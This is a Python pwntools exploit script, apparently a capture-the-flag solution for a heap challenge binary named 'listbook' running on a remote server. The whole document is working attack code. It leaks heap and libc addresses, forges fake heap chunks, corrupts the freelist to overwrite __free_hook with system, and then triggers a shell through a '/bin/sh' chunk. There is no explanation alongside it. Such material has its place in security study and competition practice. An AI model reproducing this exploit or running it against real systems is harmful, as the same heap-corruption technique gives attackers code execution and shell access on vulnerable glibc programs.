from pwn import *
import sys
import time
from ctypes import c_int8

#gdb pipe-ing client
# context.terminal = ['/opt/gdb/client.sh']

OPTIONS = {
        'binary' : './listbook',
        'server' : '111.186.58.249',
        'port' : 20001,
        'libc': None
}

# gdb_commands = """
# b read
# """

def rc():
    r.recvuntil(">>")

def add(name, content):
    r.sendline('1')
    r.sendafter('>', name.ljust(0x10, "\x00"))
    r.sendafter('>', content.ljust(0x200, "\x00"))
    _hash = 0
    for char in name:
        _hash += ord(char)
        _hash = _hash&0xff
    signed_hash = abs(c_int8(_hash).value)
    rc()
    return signed_hash%16

def delete(idx):
    r.sendline('2')
    r.sendlineafter('>', str(idx))
    rc()

def show(idx):
    r.sendline('3')
    r.sendlineafter('>', str(idx))
    data = r.recvuntil('1.add', drop=True)
    rc()
    return data

def exploit(r):
    rc()
    # for m in range(0x100):
        # print(m)
        # if m == 10:
            # continue
        # add(chr(m), str(m))
    leak_idx = add("A"*0xf + "D", "BBBB")
    add("A"*0xf + "D", "BBBB")

    heap_leak = u64(show(leak_idx)[0x10:0x16].ljust(8, "\x00")) - 0x2a0
    print("Heap leak -> ", hex(heap_leak))

    # Exploit start


    # for m in range(7):
        # add(chr(0x5), "AAAA")
    # add(chr(128), "SICE")

    # delete(0x5)

    # delete(0)
    
    # for m in range(0x200/20):
        # add(chr(0x6), "DDDD")

#     add(chr(0x1), "CCCC")
    
    # for m in range(7):
        # add(chr(0x7), "EEEE")

    # add(chr(0x8), "GGGG")
    # add(chr(0x8), "GGGG")

    # delete(0x7)
    

    # delete(0x8)
    # delete(0x1)

    # add(chr(0x80), "SICEME")

    # libc_leak = u64(show(1).strip().split('=> ')[1].ljust(8, "\x00")) - 0x1ebde0
    # print("Libc leak -> ", hex(libc_leak))

    for m in range(8):
        add(chr(0x5), "AAAA")

    delete(0x5)

    for m in range(7):
        add(chr(0x5), "B")

    for m in range(2):
        add(chr(0x0), "AAAA") 
    add(chr(0x1), "BBBB")

    add(chr(0x6), "PAD")

    delete(0x5)

    delete(0x0)
    delete(0x1)
    
    add(chr(0x80), "F")

    for m in range(6):
        add(chr(0x7), "CCCC")



    fake_chunk1 = "H"*(144-0x10)
    fake_chunk1 += p64(0x0) + p64(0x31) + p64(0x0)*4
    fake_chunk1 += p64(0x0) + p64(0x31) + p64(0x0)*4
    fake_chunk1 += p64(0x0) + p64(0x31) + p64(0x0)*4
    add(chr(0x8), fake_chunk1)


    fake_chunk2 = "G"*(96-0x10)
    fake_chunk2 += p64(0x0) + p64(0x31) + p64(0x0)*4
    fake_chunk2 += p64(0x0) + p64(0x31) + p64(0x0)*4
    fake_chunk2 += p64(0x0) + p64(0x31) + p64(0x0)*4
    add(chr(0x9), fake_chunk2)

    delete(0)
    delete(0x8)

    leak_from_addr = heap_leak + 0x1ef0
    current_chunk_addr = heap_leak + 0x1b30

    fake_chunk3 = "F"*(144-0x10)
    fake_chunk3 += p64(0x0) + p64(0x31)
    fake_chunk3 += p64(0x2) + p64(0x0)
    fake_chunk3 += p64(0x0) + p64(leak_from_addr)

    # fake_chunk3 += p64(0x0) + p64(0x31)
    # fake_chunk3 += p64(0x2) + p64(0x0)
    # fake_chunk3 += p64(current_chunk_addr+0x30+0x30) + p64(leak_from_addr)

    # fake_chunk3 += p64(0x0) + p64(0x31)
    # fake_chunk3 += p64(0x2) + p64(0x0)
    # fake_chunk3 += p64(0x0) + p64(leak_from_addr)

    add(chr(0x2), fake_chunk3)

    libc_leak = u64(show(2).strip().split('=> ')[1].ljust(8, "\x00")) - 0x1ebbe0 

    print(hex(libc_leak))

    delete(0x1)
    delete(0x9)

    fake_chunk4_addr = heap_leak + 0x1d40

    fake_chunk4 = "F"*(144-0x10-0x30)
    fake_chunk4 += p64(0x0) + p64(0x31)
    fake_chunk4 += p64(0xc) + p64(0x0)
    fake_chunk4 +=  p64(fake_chunk4_addr+0x30) + p64(fake_chunk4_addr-0x60)

    fake_chunk4 += p64(0x0) + p64(0x31)
    fake_chunk4 += p64(0xc) + p64(0x0)
    fake_chunk4 += p64(fake_chunk4_addr+0x30*2) + p64(fake_chunk4_addr+0x30*5)

    fake_chunk4 += p64(0x0) + p64(0x31)
    fake_chunk4 += p64(0xc) + p64(0x0)
    fake_chunk4 += p64(fake_chunk4_addr+0x30*3) + p64(fake_chunk4_addr+0x30*6) 

    fake_chunk4 += p64(0x0) + p64(0x31)
    fake_chunk4 += p64(0xc) + p64(0x0)
    fake_chunk4 += p64(0x0) + p64(fake_chunk4_addr+0x30*7) 


    fake_chunk4 += p64(0x0) + p64(0x31) + p64(0x0)*4
    fake_chunk4 += p64(0x0) + p64(0x31) + p64(0x0)*4
    fake_chunk4 += p64(0x0) + p64(0x31) + p64(0x0)*4
    fake_chunk4 += p64(0x0) + p64(0x31) + p64(0x0)*4
    fake_chunk4 += p64(0x0) + p64(0x31) + p64(0x0)*4

    print(len(fake_chunk4))


    add(chr(0xc), fake_chunk4)
    delete(0xc)

    freehook = libc_leak + 0x1eeb28
    system = libc_leak + 0x55410

    fake_bs = "L"*(0x180-0x10)
    fake_bs += p64(0x0) + p64(0x31) + p64(freehook) + p64(0x0)*3

    add(chr(0xd), fake_bs)

    add(p64(system), "MMM") 
    add(p64(system), "MMM") 


    add(chr(0xf), "/bin/sh")
    


    r.interactive()


if __name__ == "__main__":
        binary = ELF(OPTIONS['binary'], checksec=False)
        if OPTIONS['libc'] != None:
                libc = ELF(OPTIONS['libc'], checksec=False)     
        # else:
                # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
        if args['REMOTE'] == '1':
                r = remote(OPTIONS['server'], OPTIONS['port'])
                exploit(r)
        else:
                r = process(OPTIONS['binary'])
                # gdb.attach(r, gdb_commands)
                pause()
                exploit(r)

